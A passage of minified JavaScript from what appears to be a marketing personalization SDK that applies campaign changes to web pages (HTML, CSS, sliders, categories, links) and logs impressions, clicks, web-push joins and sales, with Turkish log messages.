if(ua.match(/\b(coc_coc_browser)\/(\d+)/)!=null||(navigator.vendor&&navigator.vendor=='Coc Coc')){tem=ua.match(/\b(coc_coc_browser)\/(\d+)/)||'';done=true;M[0]='CocCoc';M[1]=(tem[2]||-1);}
if(!done){M=M[2]?[M[1],M[2]]:[navigator.appName,navigator.appVersion,-1];if((tem=ua.match(/version\/(\d+)/i))!=null)
M.splice(1,1,tem[1]);}
if(typeof version!=='undefined'&&version)
return M[1]||-1;if(M[0]=='MSIE')M[0]='IE';if(typeof lowerCase!=='undefined'&&lowerCase)
M[0]=M[0].toLowerCase();return M[0];},conTrace:function(){if(spApi.debugModeIsOpen()&&typeof console.trace!=='undefined'){console.trace.apply(console,arguments);}},errLog:function(error,data){if(typeof data=="undefined"){data={logType:'Bilinmeyen Hata'};}
data.errorName=error.name;data.errorMessage=error.message;data.errorLineNumber=error.lineNumber||'';data.errorStack=error.stack||'';data.partnerName=partnerName;data.bugType=data.bugType||'product';data.url=window.location.href;data.referrer=window.document.referrer;data.date=new Date().getTime();data.browser=spApi.getBrowser();data.browserVersion=spApi.getBrowser(true);data.browserLang=navigator.language;data.platform=navigator.platform;data.userAgent=navigator.userAgent;if(typeof spApi.errLogs==='undefined'){spApi.errLogs=[];}
spApi.errLogs.push(data);spApi.conTrace(error,data);},isBrowserSupportEnabled:function(campID){try{var browser=spApi.getBrowser();var version=Number(spApi.getBrowser(true));if(!(browser=="IE"&&version<=9)){return true;}
if(spApi.ieSupport=='0'){return false;}
if(typeof campID!=="undefined"){campID=campID.toString();var campIESupport=0;if(typeof spApi.getCamp(campID).camp!=="undefined"){campIESupport=spApi.getCamp(campID).camp["ie8Support"];if(campIESupport=="0"){return false;}}}
return true;}
catch(e){spApi.errLog(e);}},isCookieSupportEnabled:function(){try{var data={key:'scs',obj:{'t':1},campId:0};spApi.updateCookie(data);if(sQuery.cookie("scs")!=null){return true}else{return false}}catch(e){spApi.errLog(e)}},bindAutoClose:function(campaign,callback){},isLocalStorageSupport:insIsLocalStorageSupported,getParameterFromUrl:function(url,parameter)
{name=parameter.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");var regexS="[\\?&]"+name+"=([^&#]*)";var regex=new RegExp(regexS);var results=regex.exec(url);if(results==null)
return"";else
return decodeURIComponent(results[1]);},resetAddCartCount:function(){var counter=[];localStorage.setItem('addCartCount',counter);},loaded:false,setSeleniumObject:function(data){try{spApi.dbLog=[];sQuery.each(data,function(key,tempLog){var campId=tempLog.campId;if(campId==undefined){spApi.dbLog.push(tempLog);}else{if(spApi.dbLog[campId]==undefined)spApi.dbLog[campId]=[];spApi.dbLog[campId].push(tempLog);}});}catch(err){spApi.errLog(err);}},addDbLog:function(data){try{if(spApi.hasParameter('selenium')||sQuery.cookie('selenium')!=null){var dbData=sQuery.cookie('selenium');dbData=(dbData==null||dbData=='"[]"')?[]:JSON.parse(dbData);var log=[];sQuery.each(dbData,function(key,tempLog){log.push(tempLog);});if(data!=null)log.push(data);sQuery.cookie('selenium',sQuery.toJSON(log),{path:'/',domain:cookieDomain});spApi.setSeleniumObject(log);}}catch(err){spApi.errLog(err);}},showActiveCamp:function(){spApi.activeCamp=spApi.getCampOfThePage(spApi.camps);spApi.showCamp(spApi.activeCamp);},setCustomTrackClass:function(customCamp,controlGroupID){try{if(customCamp&&customCamp.customizationList!=null){sQuery.each(customCamp.customizationList,function(index,cstm){if(typeof cstm.selectorString!="undefined"&&typeof cstm.id!="undefined"){var classSplit=cstm.id.split("-");if(!sQuery(cstm.selectorString).is('[class*="sp-custom-'+controlGroupID+'-'+classSplit[3]+'"]')){sQuery(cstm.selectorString).addClass('sp-custom-'+controlGroupID+'-'+classSplit[3]);}}});}}catch(err){spApi.errLog(err);}},showCustomCamp:function(customCamp){if(!spApi.isBrowserSupportEnabled(customCamp.id)){return false;}
try{function setStat(campId){if(!spApi.spCampCheckStatus(campId,'step1-displayed')){cData={key:'sp-camp-'+campId,obj:{'step1-displayed':true},campId:campId};spApi.updateCookie(cData,"nolog");var logData={campId:campId,customSubId:"N/A",logType:'impression',ref:window.document.referrer};spApi.worker.SetCustomCampLog(logData);}}
var isDynamicReOrderCampaign=false;var dynamicReOrderCampaignTypes=['category','dynamic-category','dynamic-slider'];if(spApi.isControlCamp(customCamp.id)){var personalizationId=spApi.getPersonalizationId(customCamp.id);var isFirstVar=true;sQuery.each(spApi.personalizationCamps[personalizationId].variations,function(k,pCamp){if(pCamp.type!="cg"&&isFirstVar){sQuery.each(spApi.customizationCamps,function(i,camp){if(camp.id==pCamp.varId){isFirstVar=false;if(Array.isArray(camp.customizationList)){isDynamicReOrderCampaign=camp.customizationList.filter(function(customization){return dynamicReOrderCampaignTypes.indexOf(customization.type)>-1;}).length>0;if(isDynamicReOrderCampaign){customCamp.customizationList=sQuery.extend({},camp.customizationList);}}
spApi.setCustomTrackClass(camp,customCamp.id);}});}});}
spApi.logger('info','CustomPlus kampanyas ykleniyor...',customCamp.id);if(disable_camp==false&&customCamp&&(customCamp.customizationList!=null||(customCamp.customJs!=undefined&&customCamp.customJs.length>0)||(customCamp.customCss!=undefined&&customCamp.customCss.length>0))){var customOrder=0;function elementNotFoundWarning(element){spApi.logger('warning','Element not found: '+element,customCamp.id);}
function checkElement(elem,cstm){if(elem.length>0){return true;}
elementNotFoundWarning(cstm.selectorString);return false;}
function changeCategory(cstm,catIndex){if(catIndex!=customOrder){if(!spApi.isControlCamp(customCamp.id)){spApi.categorySettings().changeCategory(cstm,parseInt(catIndex),parseInt(customOrder),cstm.logClass);}
setStat(customCamp['id']);}}
function setTrackClass(elem,id){var classSplit=id.split("-");var tempId=(classSplit[2].indexOf('c')<0)?'c'+classSplit[2]:classSplit[2].replace(/c/g,'');if(!sQuery(elem).is('[class*="sp-custom-'+classSplit[2]+'"]')&&!sQuery(elem).is('[class*="sp-custom-'+tempId+'"]')){sQuery(elem).addClass(id);}}
if(customCamp.customCss!=undefined&&customCamp.customCss.length>0){spApi.logger('info','CSS Eklendi.',customCamp.id);sQuery('style#insider-custom-css-'+customCamp.id).remove();sQuery('<style />',{"id":"insider-custom-css-"+customCamp.id,"type":"text/css","class":"insider-custom-style","text":customCamp.customCss}).appendTo("head");setStat(customCamp["id"]);}
if(customCamp.customJs!=undefined&&customCamp.customJs.length>0){try{spApi.logger('info','Javascript altrld.',customCamp.id);spApi.e(customCamp.customJs);}catch(err){spApi.errLog(err,{logType:'Custom Js Syntax Error',bugType:'partner',extraData:{campId:customCamp.id,customJs:customCamp.customJs}});}
if(!(isDynamicReOrderCampaign&&spApi.isControlCamp(customCamp.id))){setStat(customCamp["id"]);}}
var storageDataKey='insCEvents';var firstStorageDataKey='insFirstCEvent';var recentlyStorageDataKey='insLastCEvent';var storageData=JSON.parse(localStorage.getItem(storageDataKey))||[];if(customCamp.customizationList!=null){try{var categoryList=spApi.categorySettings().getCategoryList();}
catch(e){var categoryList=[];}
function getCategoryIndex(categoryText){var categoryIndex=undefined;sQuery.each(categoryList,function(i,category){if(sQuery.trim(category.text)==decodeURIComponent(categoryText)){categoryIndex=i;}});return categoryIndex;}
sQuery.each(customCamp.customizationList,function(index,cstm){var elem=sQuery(cstm.selectorString);customOrder=Number(cstm.order)-1;if(typeof cstm.parentNodeSelector!="undefined"&&sQuery(cstm.parentNodeSelector).length>0){if(sQuery(cstm.parentNodeSelector)[0].innerHTML!=""){cstm.parentNodeHTML=sQuery(cstm.parentNodeSelector)[0].innerHTML;}
else{cstm.parentNodeHTML=sQuery(cstm.parentNodeSelector)[0].outerHTML;}}
else{cstm.parentNodeHTML='';}
spApi.cstmClickHandler=function(clickSelector){}
function captureCategoryClicks(){sQuery(document).on('clickedElement',function(event,element){var classesOfElement=sQuery(element).attr("class");if(classesOfElement.indexOf('ins-category-sorting')<0){return;}
if(cstm.type=='dynamic-category'){var categoryText=encodeURIComponent(sQuery.trim(spApi.categorySettings().getElementCategoryText(element)));if(cstm.userType==='all'){if(typeof(Storage)!=="undefined"){if(cstm.categoryOption=='mostClicked'){var currentStorageData=JSON.parse(localStorage.getItem(storageDataKey))||[];var storageObject={clickDate:new Date().getTime(),cat:btoa(categoryText)};currentStorageData.push(storageObject);localStorage.setItem(storageDataKey,JSON.stringify(currentStorageData));}
else if(cstm.categoryOption=='recently'){localStorage.setItem(recentlyStorageDataKey,btoa(categoryText));}
else if(cstm.categoryOption=='first'){if(spApi.sessionStorageGet(firstStorageDataKey)==null){spApi.sessionStorageSet(firstStorageDataKey,btoa(categoryText));}}}}}});}
spApi.categoryClickHandler=function(selector){if(spApi._categoryClickHandlerDefined){return;}
spApi._categoryClickHandlerDefined=true;sQuery(selector).addClass('ins-category-sorting');captureCategoryClicks();};if(cstm.type=="html"){var customElement;if(typeof cstm.selectorString!="undefined"){customElement=elem;}
var selectedElement=cstm.selectedElement;if(customElement!=undefined&&customElement.length>0){spApi.logger('info','HTML deitiriliyor',customCamp.id);try{switch(cstm.positioningType){case"replace":if(customElement[0]["tagName"]=="IMG"||customElement[0]["tagName"]=="INPUT"){var cElem=sQuery(cstm.html);if(cElem.length<1){cstm.html='<span>'+cstm.html+'</span>';var cElem=sQuery(cstm.html);}
setTrackClass(cElem,cstm.id);customElement[0].outerHTML=cElem[0].outerHTML;}
else{customElement.html(""+cstm.html);setTrackClass(customElement,cstm.id);}
break;case"positioningInside":customElement.append(""+cstm.html);break;case"positioningAround":customElement.after(""+cstm.html);break;}
if(cstm.onclickJS.length>0){spApi.e(cstm.onclickJS);}
setStat(customCamp["id"]);}catch(err){spApi.errLog(err);}}
else{spApi.logger('warning','HTML deitirmede element bulunamad.',customCamp.id);}}else if(cstm.type=="slide"){spApi.logger('info','Slider deitirme uygulanyor.',customCamp.id);var sliderInterval=setInterval(function(){if(spApi.sliderSettings().getImageList().length>0){clearInterval(sliderInterval);cstm.originalSliderList=spApi.sliderSettings().getImageList();var changingList=spApi.sliderSettings().getImageList();sQuery.each(cstm.slideList,function(index,slide){if(slide.type=='move'){changingList=spApi.dynamicSlider.arrayMove(changingList,slide.oldIndex,slide.newIndex);}
else if(slide.type=='change'){changingList[slide.order].src=slide.src;changingList[slide.order].href=slide.href;}});sQuery.each(changingList,function(index,slide){if(index<spApi.sliderSettings().getImageList().length){spApi.sliderSettings().changeSlider(slide,index);}});}
setStat(customCamp["id"]);},100);sQuery(window).load(function(){setTimeout(function(){clearInterval(sliderInterval);},1000);});}else if(cstm.type==='dynamic-slider'){spApi.logger('info','Slider deitirme uygulanyor.',customCamp.id);cstm.originalSliderList=spApi.sliderSettings().getImageList();spApi.dynamicSlider.updateSlides(cstm,customCamp['id'],setStat);}
else if(cstm.type=='random'){var sliderList=spApi.sliderSettings().getImageList();if(cstm.option=='all'){var shuffleSliders=[];sQuery.each(sliderList,function(i,v){shuffleSliders.push(i+1);});setStat(customCamp["id"]);}
else if(cstm.option=='group'){var shuffleSliders=cstm.group.replace(/ /g,'').split(",");setStat(customCamp["id"]);}
spApi.logger('info','Random slider uygulanyor.',customCamp.id);var backupSliders=shuffleSliders.slice(0);sQuery.each(shuffleSliders,function(k,val){var copySliders=backupSliders.slice(0);var copyNumberIndex=copySliders.indexOf(val);if(copyNumberIndex>-1){copySliders.splice(copyNumberIndex,1);}
var min=0;var max=copySliders.length;var randomNum=Math.floor(Math.random()*(max-min))+min;var slideIndex=val-1;var randonIndex=copySliders[randomNum]-1;var numIndex=backupSliders.indexOf(copySliders[randomNum]);if(numIndex>-1){backupSliders.splice(numIndex,1);}
copySliders.splice(randomNum,1);if(sliderList[slideIndex]!=undefined){spApi.sliderSettings().changeSlider(sliderList[slideIndex],randonIndex);}});}
else if(cstm.type=='category'){if(spApi.categorySettings().getCategoryList().length>0){spApi.logger('info','Category deitirme uygulanyor.',customCamp.id);if(!spApi.isControlCamp(customCamp.id)){sQuery.each(cstm.categoryList,function(index,category){if(category.type==='move'){spApi.categorySettings().changeCategory(category,parseInt(category.oldIndex),parseInt(category.newIndex),category.logClass);}});}
setStat(customCamp['id']);}}
else if(cstm.type=='dynamic-category'){if(spApi.categorySettings().getCategoryList().length>0){spApi.logger('info','Dynamic Category deitirme uygulanyor.',customCamp.id);if(cstm.userType==='all'){if(cstm.categoryOption==='mostClicked'){var countData={};if(storageData.length>0){sQuery.each(storageData,function(key,value){if(typeof countData[value.cat]==='undefined'){countData[value.cat]=0;}
countData[value.cat]++;});var sortedData=[];for(var cat in countData){sortedData.push([atob(cat),countData[cat]]);}
sortedData.sort(function(a,b){return b[1]-a[1]});var catText=sortedData[0][0];var catIndex=getCategoryIndex(catText);customCamp.customizationList[index].oldIndex=catIndex;customCamp.customizationList[index].newIndex=customOrder;changeCategory(cstm,catIndex);}}
else if(cstm.categoryOption==='recently'){if(localStorage.getItem(recentlyStorageDataKey)!=null){var catText=atob(localStorage.getItem(recentlyStorageDataKey));var catIndex=getCategoryIndex(catText);changeCategory(cstm,catIndex);}}
else if(cstm.categoryOption==='first'){if(spApi.sessionStorageGet(firstStorageDataKey)!=null){var catText=atob(spApi.sessionStorageGet(firstStorageDataKey));var catIndex=getCategoryIndex(catText);changeCategory(cstm,catIndex);}}
try{spApi.categorySettings().triggerClick();}
catch(e){}}}}
else if(cstm.type=='css'){if(spApi.objKeys(cstm.settings)){if(checkElement(elem,cstm)){spApi.logger('info','CSS uygulanyor. Element: '+cstm.selectorString,customCamp.id);sQuery.each(cstm.settings,function(style,vals){elem.css(style,vals.value);});setTrackClass(cstm.selectorString,cstm.id);setStat(customCamp["id"]);}}}
else if(cstm.type=='track'){if(checkElement(elem,cstm)){if(!elem.is('[class*="sp-custom-'+customCamp.id+'"]')){spApi.logger('info','Click log takibi uygulanyor. Element: '+cstm.selectorString,customCamp.id);setTrackClass(cstm.selectorString,cstm.id);setStat(customCamp["id"]);}}}
else if(cstm.type=='remove'){if(checkElement(elem,cstm)){spApi.logger('info','Click log takibi uygulanyor. Element: '+cstm.selectorString,customCamp.id);elem.hide();setStat(customCamp["id"]);}}else if(cstm.type==='rearrangeElement'){if(checkElement(elem,cstm)){spApi.logger('info','Element pozisyonu deitiriliyor. Element: '+cstm.selectorString,customCamp.id);var element=sQuery(cstm.oldPosition.elementSelector);var newPositionHelper=sQuery(cstm.newPosition.helperSelector);switch(cstm.newPosition.insertType){case'prepend':newPositionHelper.prepend(element);break;case'after':newPositionHelper.after(element);break;}
setTrackClass(cstm.newPosition.elementSelector,cstm.id);setStat(customCamp.id);}}else if(cstm.type==='moveElement'){if(checkElement(elem,cstm)){spApi.logger('info','Element pozisyonu deitiriliyor. Element: '+cstm.selectorString,customCamp.id);elem.css(cstm.newPosition);setTrackClass(cstm.selectorString,cstm.id);setStat(customCamp.id);}}else if(cstm.type==='changedHTML'||cstm.type==='changedText'){if(checkElement(elem,cstm)){spApi.logger('info','HTML deitirme uygulanyor. Element: '+cstm.selectorString,customCamp.id);if(elem[0].innerHTML!=""){elem.html(cstm.html);}
else{elem[0].outerHTML=cstm.html;}
setTrackClass(cstm.selectorString,cstm.id);setStat(customCamp["id"]);}}
else if(cstm.type=='changedImage'){if(checkElement(elem,cstm)){spApi.logger('info','Resim deitirme uygulanyor. Element: '+cstm.selectorString,customCamp.id);cstm.oldSource=elem.attr('src');elem.attr('src',cstm.src);setTrackClass(cstm.selectorString,cstm.id);setStat(customCamp["id"]);}}
else if(cstm.type=='insertedHTML'){if(checkElement(elem,cstm)){spApi.logger('info','HTML ekleniyor. Element: '+cstm.selectorString,customCamp.id);var tempElem=sQuery(cstm.html);if(tempElem.length>0||tempElem.children().length>0){var tempHTML=sQuery(cstm.html).addClass(cstm.id);}
else{var tempHTML='<span class="'+cstm.id+'">'+cstm.html+'</span>';}
if(cstm.insertOption=='elementAfter'){elem.after(tempHTML);}
else if(cstm.insertOption=='elementBefore'){elem.before(tempHTML);}
else if(cstm.insertOption=='after'){if(elem[0].tagName=='IMG'||elem[0].tagName=='INPUT'){elem.after(tempHTML);}
else{elem.append(tempHTML);}}
else if(cstm.insertOption=='before'){if(elem[0].tagName=='IMG'||elem[0].tagName=='INPUT'){elem.before(tempHTML);}
else{elem.prepend(tempHTML);}}
setStat(customCamp["id"]);}}
else if(cstm.type=='insertImage'){if(checkElement(elem,cstm)){spApi.logger('info','Resim ekleniyor. Element: '+cstm.selectorString,customCamp.id);var image=document.createElement('img');sQuery(image).attr('src',cstm.src).addClass(cstm.id);if(cstm.insertOption=='elementAfter'){elem.after(image);}
else if(cstm.insertOption=='elementBefore'){elem.before(image);}
else if(cstm.insertOption=='after'){if(elem[0].tagName=='IMG'||elem[0].tagName=='INPUT'){elem.after(image);}
else{elem.append(image);}}
else if(cstm.insertOption=='before'){if(elem[0].tagName=='IMG'||elem[0].tagName=='INPUT'){elem.before(image);}
else{elem.prepend(image);}}
setStat(customCamp["id"]);}}
else if(cstm.type=='editHyperLink'){if(checkElement(elem,cstm)){spApi.logger('info','HyperLink deitirildi. Element: '+cstm.selectorString,customCamp.id);if(elem[0].tagName=='A'){elem.attr('href',cstm.linkUrl);if(cstm.newTab==1){elem.attr('target','_blank');}
else{elem.attr('target','');}
setTrackClass(cstm.selectorString,cstm.id);}
else{elem.closest('a').attr('href',cstm.linkUrl);if(cstm.newTab==1){elem.closest('a').attr('target','_blank');}
else{elem.closest('a').attr('target','');}
setTrackClass(cstm.selectorString,cstm.id);}
elem.html(cstm.linkText);setStat(customCamp["id"]);}}
else if(cstm.type=='makeHyperLink'){if(checkElement(elem,cstm)){spApi.logger('info','HyperLink ekleniyor. Element: '+cstm.selectorString,customCamp.id);var newTab='';if(cstm.newTab==1){newTab='_blank';}
var newHyperLink=document.createElement('a');sQuery(newHyperLink).attr('href',cstm.linkUrl).attr('target',newTab).addClass(cstm.id).text(cstm.linkText);if(elem[0].tagName=='IMG'){elem.wrap(newHyperLink);}
else{elem.html('').append(newHyperLink);}
setStat(customCamp["id"]);}}
else if(cstm.type=='elementAttr'){if(checkElement(elem,cstm)){spApi.logger('info','Element zellii deitiriliyor. Element: '+cstm.selectorString,customCamp.id);sQuery(cstm.attrs).each(function(i,v){if(v.type=='changed'||v.type=='added'){elem.attr(v.key,v.val);}
else if(v.type=='deleted'){elem.removeAttr(v.key);}});setTrackClass(cstm.selectorString,cstm.id);setStat(customCamp["id"]);}}});spApi.viewedCustomCamps.push(customCamp);}}}catch(err){spApi.errLog(err,{logType:'showCustomCamp',bugType:'product'});}},clearCustomCamps:function(){try{sQuery('.insider-custom-style').remove();if(!(spApi.viewedCustomCamps.length>0))return false;sQuery.each(spApi.viewedCustomCamps,function(key,customCamp){if(customCamp&&customCamp.customizationList!=null){var listLength=customCamp.customizationList.length||Object.keys(customCamp.customizationList).length;for(var i=listLength-1;i>=0;i--){customization=customCamp.customizationList[i];if(customization.type=="html"){if(customization["positioningType"]=="positioningFix"||customization["positioningType"]=="positioningAround"||customization["positioningType"]=="positioningInside"){sQuery("."+customization["id"]).remove();}else{if(sQuery(customization["selectorString"]).length>0){sQuery(customization["selectorString"]).html(customization["selectedOriginalHTML"]);}}}else if(customization.type==='slide'||customization.type==='dynamic-slider'){sQuery.each(customization.originalSliderList,function(index,slide){if(index<spApi.sliderSettings().getImageList().length){spApi.sliderSettings().changeSlider(slide,index);}});}else if(customization.type=='category'){for(var i=customization.categoryList.length-1;i>=0;i--){var slide=customization.categoryList[i];if(slide.type==='move'){spApi.categorySettings().changeCategory(slide,parseInt(slide.newIndex),parseInt(slide.oldIndex),slide.logClass);}}}else if(customization.type=='dynamic-category'&&typeof customization.newIndex!=='undefined'&&typeof customization.oldIndex!=='undefined'){spApi.categorySettings().changeCategory(customization,parseInt(customization.newIndex),parseInt(customization.oldIndex),customization.logClass);delete customization.newIndex;delete customization.oldIndex;}else if(customization.type=='css'){if(spApi.objKeys(customization.settings)){sQuery.each(customization.settings,function(style,vals){if(sQuery(customization.selectorString).length>0){sQuery(customization.selectorString).css(style,vals.defaultVal);}});}}else if(customization.type=="remove"){if(sQuery(customization.selectorString).length>0){sQuery(customization.selectorString).show();}}else if(customization.type=='changedText'){if(sQuery(customization.parentNodeSelector).length>0){sQuery(customization.parentNodeSelector).html(customization.parentNodeHTML);}}
else if(customization.type=='changedImage'){if(sQuery(customization.selectorString).length>0){sQuery(customization.selectorString).attr('src',customization.oldSource);}}
else if(customization.type=='rearrangeElement'){var element=sQuery(customization.newPosition.elementSelector);if(element.length>0){switch(customization.oldPosition.insertType){case'prepend':sQuery(customization.oldPosition.helperSelector).prepend(element);break;case'insertAfter':element.insertAfter(sQuery(customization.oldPosition.helperSelector));break;}}}
else if(customization.type==='moveElement'){var element=sQuery(customization.selectorString);if(element.length>0){element.css(customization.oldPosition);}}
else if(customization.type=='insertedHTML'){if(sQuery(customization.selectorString).length>0){sQuery('.'+customization.id).remove();}}
else if(customization.type=='insertImage'){if(sQuery(customization.parentNodeSelector).length>0){sQuery('.'+customization.id).remove();}}
else if(customization.type=='editHyperLink'){if(sQuery(customization.selectorString).length>0){if(sQuery(customization.selectorString)[0].tagName=='A'){sQuery(customization.selectorString).attr('href',customization.oldUrl);sQuery(customization.selectorString).attr('target',customization.oldNewTab);}
else{sQuery(customization.selectorString).closest('a').attr('href',customization.oldUrl);sQuery(customization.selectorString).closest('a').attr('target',customization.oldNewTab);}
sQuery(customization.selectorString).html(customization.oldText);}}
else if(customization.type=='makeHyperLink'){if(typeof customization.parentNodeSelector!="undefined"&&sQuery(customization.parentNodeSelector).length>0){sQuery('.'+customization.id).remove();}
else if(sQuery(customization.selectorString).length>0){sQuery(customization.selectorString).html(customization.oldText);}}};}});}
catch(err){spApi.errLog(err);}
sQuery.each(spApi.customizationCamps,function(key,customCamp){spApi.customizationCamps[key].dontCheck=false;});},initCustomCamps:function(docReady){try{if(!(spApi.customizationCamps.length>0))return false;if(docReady===false){sQuery(document).on('clickedElement',function(event,element){var classArray=sQuery(element).attr("class").split(" ");var spCustomSelector=sQuery.grep(classArray,function(value){return value.indexOf('sp-custom-')>-1;});sQuery.each(spCustomSelector,function(i,className){classSplit=className.split('-');if(typeof classSplit[2]!="undefined"){var exactId=parseInt(classSplit[2].replace('c',''));if(exactId>0){var other='';if(sQuery(element).data('sliderHref')!==undefined){other=sQuery(element).data('sliderHref');}
var logData={campId:classSplit[2],customSubId:classSplit[3],logType:'joined',ref:window.document.referrer,other:other};spApi.worker.SetCustomCampLog(logData);}}});});var docReadyResult=sQuery.grep(Object.keys(spApi.rules),function(i){return spApi.rules[i].docReadyOption=='1';});if(docReadyResult.length==0){spApi.removePageOpacity();return false;}}
sQuery.each(spApi.customizationCamps,function(key,customCamp){if(docReady===false){if(customCamp.runDocReady==='1'){var tempCamp=[];tempCamp.push(customCamp);customCamp=spApi.getCampOfThePage(tempCamp);if(customCamp){spApi.customizationCamps[key].dontCheck=true;var campReady=false;if(customCamp.customizationList==null){spApi.showCustomCamp(customCamp);}
else{var selectorCount=0;var selectorCountControl=[];sQuery.each(customCamp.customizationList,function(k,customization){if(typeof customization.selectorString!="undefined"){selectorCount++;}});if(selectorCount==0){spApi.showCustomCamp(customCamp);}
else{var timeoutLoop=function(){setTimeout(function(){sQuery.each(customCamp.customizationList,function(k,customization){if(typeof customization.selectorString!="undefined"&&selectorCountControl[k]==undefined&&sQuery(customization.selectorString).length>0){selectorCountControl[k]=customization.selectorString;}});if(selectorCount==selectorCountControl.length){spApi.showCustomCamp(customCamp);campReady=true;spApi.removePageOpacity();}
else if(spApi.inited===true&&campReady===false){spApi.showCustomCamp(customCamp);campReady=true;spApi.removePageOpacity();}
else if(spApi.inited===false){timeoutLoop();}},10);};timeoutLoop();}}}}}
else{if(typeof customCamp.dontCheck==="undefined"||customCamp.dontCheck===false){var tempCamp=[];tempCamp.push(customCamp);customCamp=spApi.getCampOfThePage(tempCamp);if(customCamp){spApi.showCustomCamp(customCamp);}}}});}catch(err){spApi.errLog(err);}},setCampSalesSesId:function(){if(spApi.salesSesId==false){spApi.errLog({name:'Error',message:'salesSessionIdNotExists'},{logType:'salesSesId',bugType:'product',extraData:{salesSesId:spApi.salesSesId}});return;}
var currentCookie='';try{var pairs=spApi.allStorageData();sQuery.each(pairs,function(i,obj){var key=obj.key;var value=obj.value;if(key.indexOf("sp-camp-")!=-1){currentCookie=obj;if(typeof value!=="undefined"){var campId=(key.replace('sp-camp-','')).replace(/^\s+|\s+$/gm,'');var objData=JSON.parse(unescape(value));var sesExpireTime=30*60;if(value.indexOf("salesSesId")==-1){objData.salesSesId=spApi.Base64.decode(spApi.salesSesId);objData.salesSesTime=spApi.getTime();var data={key:'sp-camp-'+campId,obj:objData,campId:campId};spApi.updateCookie(data,'nolog');}else if((parseInt(objData.salesSesTime)+sesExpireTime)>=spApi.getTime()&&objData.salesSesId==spApi.Base64.decode(spApi.salesSesId)){objData.salesSesTime=spApi.getTime();var data={key:'sp-camp-'+campId,obj:objData,campId:campId};spApi.updateCookie(data,'nolog');}}}});}catch(err){spApi.errLog(err,{logType:'setCampSalesSesId',bugType:'product',extraData:{Cookie:currentCookie,salesSesId:spApi.salesSesId}});}},setPushJoinLog:function(){try{var parameter='webPushId';if(spApi.hasParameter(parameter)){var campId=spApi.Base64.decode(decodeURIComponent(spApi.getParameter(parameter)));if(campId!=null&&!isNaN(campId)){var insWp=spApi.storageData('ins-wp-'+campId);if(insWp==null){spApi.updateCookie({key:'ins-wp-'+campId,obj:{joDa:spApi.getTime(),sId:spApi.getGAStyleSesId()},campId:campId},'nolog');spApi.worker.send('do-logging',{type:'webPush',campId:campId,logType:'camp-join',browser:spApi.getBrowser(),isMobile:spApi.isMobileBrowser(),referer:spApi.urlencode(window.location.href),primaryAction:spApi.hasParameter('insider-primary-action'),secondaryAction:spApi.hasParameter('insider-secondary-action')});}else{insWp=JSON.parse(insWp);var webPush=spApi.webPushes[campId];var dynamicPushTitle=spApi.parseDynamicPushContent(webPush.title);var dynamicPushDescription=spApi.parseDynamicPushContent(webPush.description);var dynamicContentExist=dynamicPushTitle.customAttributeExist||dynamicPushDescription.customAttributeExist;if(typeof insWp.joDa==="undefined"){insWp.joDa=spApi.getTime();insWp.sId=spApi.getGAStyleSesId();spApi.updateCookie({key:'ins-wp-'+campId,obj:insWp,campId:campId},'nolog');spApi.worker.send('do-logging',{type:'webPush',campId:campId,logType:'camp-join',browser:spApi.getBrowser(),isMobile:spApi.isMobileBrowser(),referer:spApi.urlencode(window.location.href),dynamicContentExist:dynamicContentExist,primaryAction:spApi.hasParameter('insider-primary-action'),secondaryAction:spApi.hasParameter('insider-secondary-action')});}}}}}catch(err){spApi.errLog(err,{logType:'setPushJoinLog',bugType:'product'});}},setPushSalesLog:function(orderID){try{var pairs=spApi.allStorageData();sQuery.each(pairs,function(i,obj){var key=sQuery.trim(obj.key);if(key.indexOf("ins-wp-")!=-1){var wpCookie=JSON.parse(unescape(obj.value));if(typeof wpCookie!=='undefined'&&wpCookie!=null&&wpCookie.sId==spApi.getGAStyleSesId()){var campId=key.split("-")[2];spApi.worker.send('do-logging',{type:'webPush',campId:campId,logType:'sales-from-click',referer:spApi.urlencode(window.location.href),otherProperties:{sessionId:spApi.getGAStyleSesId(),orderId:orderID,paidProducts:(spApi.storageData('paid-products')!=null)?spApi.storageData('paid-products'):'',originalPrice:spApi.getExchangeRate(spApi.preferredCurrency,sQuery.cookie('current-currency'),sQuery.cookie('total-cart-amount'),'price'),originalCurrency:(sQuery.cookie('current-currency')!=null)?sQuery.cookie('current-currency'):'',convertedCurrency:spApi.preferredCurrency,convertedPrice:(sQuery.cookie('total-cart-amount')!=null)?sQuery.cookie('total-cart-amount'):''}});}}});}catch(err){spApi.errLog(err,{logType:'setPushSalesLog',bugType:'product',extraData:{orderID:orderID}});}},migratingToLocalStorage:function(){var cookies=getCookies();for(var cookie in cookies){try{if(cookie.indexOf("sp-camp")!=-1){var cookieContent=JSON.parse(cookies[cookie]);var campId=cookie.split("-");var campId=campId[2];var getViDa=new Date(cookieContent.viDa*1000);;var getNowDate=new Date();var getDifference=getNowDate.getDate()-getViDa.getDate();var setNewExpireDayCount=spApi.getCamp(campId).camp.cookieTime-getDifference;spApi.storageData(cookie,cookies[cookie],{expires:setNewExpireDayCount});sQuery.cookie(sQuery.trim(cookie),1,{expires:-1,path:'/',domain:cookieDomain});spApi.logger('info',cookie+' cookie migrated to local storage');}
if(cookie.indexOf("cus")!=-1){var customSegmentId=(cookie.replace(/[^\d]/g,''));var customSegment={};sQuery.each(spApi.customSegments,function(index,value){if(value['id']==customSegmentId){customSegment=value;return true;}});if(sQuery.cookie('cus'+customSegmentId)!==null){var expDate=new Date(customSegment.activeDateEnd*1000);spApi.storageData(cookie,cookies[cookie],{expires:expDate});sQuery.cookie(sQuery.trim(cookie),'1',{expires:-1,path:'/',domain:cookieDomain});spApi.logger('info',cookie+' cookie migrated to local storage');}}
if(cookie.indexOf("user-segments")!=-1||cookie.indexOf("paid-products")!=-1){if(cookies[cookie].length>0){var cookieContent=JSON.parse(cookies[cookie]);}
spApi.storageData(sQuery.trim(cookie),cookies[cookie]);sQuery.cookie(sQuery.trim(cookie),1,{expires:-1,path:'/',domain:cookieDomain});spApi.logger('info',cookie+' cookie migrated to local storage');}
if(cookie.indexOf("sp-goal-")!=-1){spApi.storageData(sQuery.trim(cookie),cookies[cookie]);sQuery.cookie(sQuery.trim(cookie),1,{expires:-1,path:'/',domain:cookieDomain});spApi.logger('info',cookie+' cookie migrated to local storage');}
